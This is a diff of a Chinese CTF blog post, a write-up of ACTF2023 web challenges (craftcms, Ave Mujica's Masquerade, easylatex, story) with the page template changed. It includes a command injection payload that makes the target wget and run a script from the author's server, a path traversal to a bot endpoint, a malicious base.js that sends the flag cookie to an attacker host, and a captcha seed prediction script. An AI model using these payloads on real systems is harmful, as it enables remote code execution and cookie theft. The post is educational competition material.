@@ -1,239 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 6.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
 
-<link rel="stylesheet" href="/css/main.css">
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
 
+    
+<link rel="stylesheet" href="/css/style.css">
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="又爆0了 :(">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ACTF2023">
-<meta property="og:url" content="http://example.com/2023/10/31/ACTF2023/index.html">
-<meta property="og:site_name" content="unknown&#39;s Blog">
-<meta property="og:description" content="又爆0了 :(">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/b5059ae49cd1b07808e4095c7aad67f.png">
-<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/1698674170753.png">
-<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/1698675367244.png">
-<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/image-20231031220924167.png">
-<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/1698761463686.png">
-<meta property="article:published_time" content="2023-10-30T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-11-02T08:10:57.877Z">
-<meta property="article:author" content="unknown">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/b5059ae49cd1b07808e4095c7aad67f.png">
-
-<link rel="canonical" href="http://example.com/2023/10/31/ACTF2023/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'en'
-  };
-</script>
-
-  <title>ACTF2023 | unknown's Blog</title>
-  
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 
+<body id="bodyx">
 
+    
 
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">unknown's Blog</h1>
-      <span class="logo-line-after"><i></i></span>
+    
+<div class="hd posts">
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
     </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <div class="post-title">
+        <p>
+            ACTF2023
+        </p>
+        <hr>
     </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-        <li class="menu-item menu-item-links">
-
-    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/31/ACTF2023/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/unknown.jpg">
-      <meta itemprop="name" content="unknown">
-      <meta itemprop="description" content="memories matter">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="unknown's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          ACTF2023
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-10-31 00:00:00" itemprop="dateCreated datePublished" datetime="2023-10-31T00:00:00+08:00">2023-10-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-11-02 16:10:57" itemprop="dateModified" datetime="2023-11-02T16:10:57+08:00">2023-11-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
-                </span>
-            </span>
-
-          
-            <div class="post-description">又爆0了 :(</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
+    <div class="post-content">
         <h1 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h1><p>一开始用网上现成的做法打imagick会无响应。后来lolita出了知道，原来是靶机打down一次，&#x2F;tmp就会有残留的php*文件，imagick读取到别的文件就继续down。所以打失败一次就必须重启一次靶机。</p>
 <p>打不通的时候想本地起一个环境的，但起环境太难给劝退了…..</p>
 <h1 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="Ave Mujica’s Masquerade"></a>Ave Mujica’s Masquerade</h1><p>做几个web题，就做这个的时候聪明点，懂得本地多打多测，而不是干看代码。</p>
 <p>shellQuote.quote的CVE原理在这：<a target="_blank" rel="noopener" href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a></p>
 <p>关键代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (url.includes(&quot;:&quot;)) &#123;</span><br><span class="line">  const parts = url.split(&quot;:&quot;);</span><br><span class="line">  host = parts[0];</span><br><span class="line">  port = parts.slice(1).join(&quot;:&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  host = url;</span><br><span class="line">&#125;</span><br><span class="line">if (port) &#123;</span><br><span class="line">  command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, port, host]); // Construct the shell command</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, &quot;80&quot;, host]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nmap = spawn(&quot;bash&quot;, [&quot;-c&quot;, command], &#123;stdio: [0,fdout,fderr] &#125; );</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (url.includes(&quot;:&quot;)) &#123;</span><br><span class="line">  const parts = url.split(&quot;:&quot;);</span><br><span class="line">  host = parts[0];</span><br><span class="line">  port = parts.slice(1).join(&quot;:&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  host = url;</span><br><span class="line">&#125;</span><br><span class="line">if (port) &#123;</span><br><span class="line">  command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, port, host]); // Construct the shell command</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, &quot;80&quot;, host]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nmap = spawn(&quot;bash&quot;, [&quot;-c&quot;, command], &#123;stdio: [0,fdout,fderr] &#125; );</span><br></pre></td></tr></table></figure>
 
 <p>文章的payload不能直接打，因为题目会对payload分割处理，要多测才能测到正确的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文章的		`:`pwnme``:`</span><br><span class="line">题目的      :`:`pwnme``:`  会执行pwnme这个命令</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章的		`:`pwnme``:`</span><br><span class="line">题目的      :`:`pwnme``:`  会执行pwnme这个命令</span><br></pre></td></tr></table></figure>
 
 <p>执行命令的结果不能回显。命令不能带重定向符，不能带${IFS}和空格。队友测$IFS$9当做分隔符可以。</p>
 <p>坏了，能执行命令但又不会了。看了眼dockerfile，有wget和curl，考虑下载文件然后执行。</p>
@@ -242,234 +54,84 @@
 <p>Enhancement: no echoes, internal network.</p>
 </blockquote>
 <p>然后执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:`:`wget$IFS$9111.111.111.1111:18999/a.sh``:`</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:`:`wget$IFS$9111.111.111.1111:18999/a.sh``:`</span><br></pre></td></tr></table></figure>
 
 <p>没权限直接执行.&#x2F;a.sh，sh$IFS$9a.sh就行。</p>
 <p>所有的操作都在本地运行，打印所有执行结果，方便排错。本地上线后才去上线靶机。</p>
-<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/b5059ae49cd1b07808e4095c7aad67f.png" alt="b5059ae49cd1b07808e4095c7aad67f.png"></p>
-<h1 id="easylatex"><a href="#easylatex" class="headerlink" title="easylatex"></a>easylatex</h1><h2 id="new-URL"><a href="#new-URL" class="headerlink" title="new URL"></a>new URL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new URL(&quot;1&quot;, `http://$&#123;req.headers.host&#125;/theme/`)</span><br><span class="line">这个url是http://$&#123;req.headers.host&#125;/theme/1</span><br><span class="line"></span><br><span class="line">new URL(&quot;http://vps:port/&quot;, `http://$&#123;req.headers.host&#125;/theme/`)</span><br><span class="line">这个url就是http://vps:port/，第二个参数不生效。</span><br><span class="line"></span><br><span class="line">比赛时只测了第一个，没测第二个。。。</span><br></pre></td></tr></table></figure>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/b5059ae49cd1b07808e4095c7aad67f.png" alt="b5059ae49cd1b07808e4095c7aad67f.png"></p>
+<h1 id="easylatex"><a href="#easylatex" class="headerlink" title="easylatex"></a>easylatex</h1><h2 id="new-URL"><a href="#new-URL" class="headerlink" title="new URL"></a>new URL</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new URL(&quot;1&quot;, `http://$&#123;req.headers.host&#125;/theme/`)</span><br><span class="line">这个url是http://$&#123;req.headers.host&#125;/theme/1</span><br><span class="line"></span><br><span class="line">new URL(&quot;http://vps:port/&quot;, `http://$&#123;req.headers.host&#125;/theme/`)</span><br><span class="line">这个url就是http://vps:port/，第二个参数不生效。</span><br><span class="line"></span><br><span class="line">比赛时只测了第一个，没测第二个。。。</span><br></pre></td></tr></table></figure>
 
 <h2 id="bot-visit-穿越"><a href="#bot-visit-穿越" class="headerlink" title="bot visit 穿越"></a>bot visit 穿越</h2><p>bot的visit存在穿越：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#x27;/share/:id&#x27;, reportLimiter, async (req, res) =&gt; &#123;</span><br><span class="line">    const &#123; id &#125; = req.params</span><br><span class="line">    console.log(id)</span><br><span class="line">    if (!id) &#123;</span><br><span class="line">        res.send(&#x27;no note id specified&#x27;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    const url = `http://localhost:$&#123;PORT&#125;/note/$&#123;id&#125;`</span><br><span class="line">    try &#123;</span><br><span class="line">        await visit(url)</span><br><span class="line">        res.send(&#x27;done&#x27;)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        console.log(e)</span><br><span class="line">        res.send(&#x27;something error&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/share/:id&#x27;, reportLimiter, async (req, res) =&gt; &#123;</span><br><span class="line">    const &#123; id &#125; = req.params</span><br><span class="line">    console.log(id)</span><br><span class="line">    if (!id) &#123;</span><br><span class="line">        res.send(&#x27;no note id specified&#x27;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    const url = `http://localhost:$&#123;PORT&#125;/note/$&#123;id&#125;`</span><br><span class="line">    try &#123;</span><br><span class="line">        await visit(url)</span><br><span class="line">        res.send(&#x27;done&#x27;)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        console.log(e)</span><br><span class="line">        res.send(&#x27;something error&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
 <p>访问: <code>/share/..%2fpreview%3ftex=1%26theme=http%3a%2f%2f192.168.190.129:14444</code></p>
 <p>即可穿越到&#x2F;preview，带了参数tex和theme。</p>
 <p>比赛时想到了会不会存在穿越，但是没测，直接当做不会了。</p>
 <h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>note.html设置了CSP。即使成为了vip，设置了theme为自己服务器上的js代码，令bot去访问也无法引用执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot;</span><br><span class="line">    content=&quot;default-src &lt;%= theme_url %&gt; https://getbootstrap.com https://cdn.jsdelivr.net &#x27;nonce-&lt;%= nonce %&gt;&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot;</span><br><span class="line">    content=&quot;default-src &lt;%= theme_url %&gt; https://getbootstrap.com https://cdn.jsdelivr.net &#x27;nonce-&lt;%= nonce %&gt;&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/1698674170753.png" alt="1698674170753.png"><br>preview.html没有设置CSP，可以执行js</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/1698674170753.png" alt="1698674170753.png"><br>preview.html没有设置CSP，可以执行js</p>
 <h2 id="base-js"><a href="#base-js" class="headerlink" title="base.js"></a>base.js</h2><p>当preview.html里的theme设置成自己的vps时，访问&#x2F;preview，会访问vps&#x2F;js&#x2F;base.js</p>
 <p>下面的是vps上放置的base.js文件</p>
 <p>token是session，session保存的username是vps地址。bot访问base.js文件，执行该js代码，带上cookie访问&#x2F;vip。此时的cookie有flag和session。随后&#x2F;vip会获取到cookie，带上cookie访问username。</p>
 <p>username指向的地址监听即可获取flag。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">async function asd()&#123;</span><br><span class="line">	//添加一个cookie，不会删除原来的。</span><br><span class="line">	//下面的fetch headers设置cookie无效，测过</span><br><span class="line">    document.cookie =  &#x27;token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0dHA6Ly8xOTIuMTY4LjE5MC4xMjk6MTU1NTUvIiwiaXNWaXAiOmZhbHNlLCJpYXQiOjE2OTg2NDY4NDl9.W_l_U9J-nvJjUYkGTdXaoFkBDBObvZotDpLi4FSWY-pb9BkcPWAd2WEKqdGQhsPC8izoSpXp3pXSWHrIQ93W9apSS4ywxmvhZ7bi3O43wpfMiWWXPgC36c9bQa-zMMv9f48l-MlVgU87mZGpB8CPUx6P73kAAGXnhpf9MvLArny93ZXECfiS5nDzjHInrCcFGM0GYZTTHQ3uKwzcaxSS7wa_Ir4oFTM_PUc6e_hCBCC5YUEyJHjknzAU1xUVPU6y0hiLoLpbXzM8axUHiN9j_CoGlXsteqa6sZsbD38OPD_-hG-xf8x2W3G7QE1T6FP_OrmBrkw3XL3eP2jQfDpemQ; Path=/&#x27;</span><br><span class="line">    await fetch(&#x27;http://localhost:3000/vip&#x27;, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">asd()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">async function asd()&#123;</span><br><span class="line">	//添加一个cookie，不会删除原来的。</span><br><span class="line">	//下面的fetch headers设置cookie无效，测过</span><br><span class="line">    document.cookie =  &#x27;token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0dHA6Ly8xOTIuMTY4LjE5MC4xMjk6MTU1NTUvIiwiaXNWaXAiOmZhbHNlLCJpYXQiOjE2OTg2NDY4NDl9.W_l_U9J-nvJjUYkGTdXaoFkBDBObvZotDpLi4FSWY-pb9BkcPWAd2WEKqdGQhsPC8izoSpXp3pXSWHrIQ93W9apSS4ywxmvhZ7bi3O43wpfMiWWXPgC36c9bQa-zMMv9f48l-MlVgU87mZGpB8CPUx6P73kAAGXnhpf9MvLArny93ZXECfiS5nDzjHInrCcFGM0GYZTTHQ3uKwzcaxSS7wa_Ir4oFTM_PUc6e_hCBCC5YUEyJHjknzAU1xUVPU6y0hiLoLpbXzM8axUHiN9j_CoGlXsteqa6sZsbD38OPD_-hG-xf8x2W3G7QE1T6FP_OrmBrkw3XL3eP2jQfDpemQ; Path=/&#x27;</span><br><span class="line">    await fetch(&#x27;http://localhost:3000/vip&#x27;, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">asd()</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/1698675367244.png" alt="1698675367244.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/1698675367244.png" alt="1698675367244.png"></p>
 <h1 id="story"><a href="#story" class="headerlink" title="story"></a>story</h1><h2 id="得到随机种子"><a href="#得到随机种子" class="headerlink" title="得到随机种子"></a>得到随机种子</h2><p>题目访问一次&#x2F;captcha就会播一次种</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self._key = (key or int(time.time())) + random.randint(1,100)</span><br><span class="line">random.seed(self._key)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">self._key = (key or int(time.time())) + random.randint(1,100)</span><br><span class="line">random.seed(self._key)</span><br></pre></td></tr></table></figure>
 
 <p>这个种子挺好猜的。只要访问一次&#x2F;captcha，然后快速执行下面的脚本，就能得到种子以及之后的captcha。所以就能知道访问vip时候的captcha。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def test(seed,code):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    ccode = generate_code()</span><br><span class="line">    if code.upper() == ccode.upper():</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">seed = int(time.time()) - 20 #产生的时间戳单位是s</span><br><span class="line">code = &#x27;C5Hp&#x27;</span><br><span class="line">for i in range(200):</span><br><span class="line">    seedd = seed + i</span><br><span class="line">    if test(seedd,code):</span><br><span class="line">        print(seedd)</span><br><span class="line">        random.seed(seedd)</span><br><span class="line">        gen = Captcha(seedd,200, 80)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        print(captcha_text)</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def test(seed,code):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    ccode = generate_code()</span><br><span class="line">    if code.upper() == ccode.upper():</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">seed = int(time.time()) - 20 #产生的时间戳单位是s</span><br><span class="line">code = &#x27;C5Hp&#x27;</span><br><span class="line">for i in range(200):</span><br><span class="line">    seedd = seed + i</span><br><span class="line">    if test(seedd,code):</span><br><span class="line">        print(seedd)</span><br><span class="line">        random.seed(seedd)</span><br><span class="line">        gen = Captcha(seedd,200, 80)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        print(captcha_text)</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
 
 <h2 id="摇3个相同的waf"><a href="#摇3个相同的waf" class="headerlink" title="摇3个相同的waf"></a>摇3个相同的waf</h2><p>下面选waf的代码，大致看了眼，从6个waf中选3个。第一反应要写6组合3也就是20种payload，针对每3种waf用不同的payload。仔细看了后发现任意3个组合到一起都不可能过，就歇逼睡觉去了。</p>
 <p>起床后发现lolita说绕一种就行，我再细看代码，想到摇到3个相同waf就行。第一反应，我靠，这怎么可能，然后本地运行试试，发现摇到3个相同的概率还挺大的…..</p>
 <p>靠，又是只看代码不测，我是sb。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">rule = [</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;],                   # rule 1</span><br><span class="line">    [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;],              # rule 2</span><br><span class="line">    [&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;],                           # rule 3</span><br><span class="line">    [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\x&#x27;,&#x27;_&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;mro&#x27;],                          # rule 4</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;],                          # rule 5</span><br><span class="line">    [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, 